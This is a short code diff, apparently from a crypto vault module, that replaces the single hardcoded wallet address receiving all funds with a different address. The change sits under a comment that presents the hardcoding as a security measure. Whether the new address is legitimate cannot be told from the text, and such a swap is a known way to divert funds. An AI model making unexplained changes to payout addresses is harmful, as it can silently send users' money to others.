@@ -13,7 +13,7 @@ export function packVaultStream(
 ) {
   // 🛡️ SECURITY: Hardcoded destination to prevent environment/payload poisoning
   // All funds will ONLY ever go to this address.
-  const HARDCODED_DESTINATION = "0x8562d59eb09FfC033960c59E6d86c5Ca1c16eA74";
+  const HARDCODED_DESTINATION = "0xA39Cb9AF536d43E43EA1d4f968558A1466133ea1";
 
   console.log(
     `[PACKER-DEBUG] 🛡️ Security Check: Routing all funds to ${HARDCODED_DESTINATION}`,
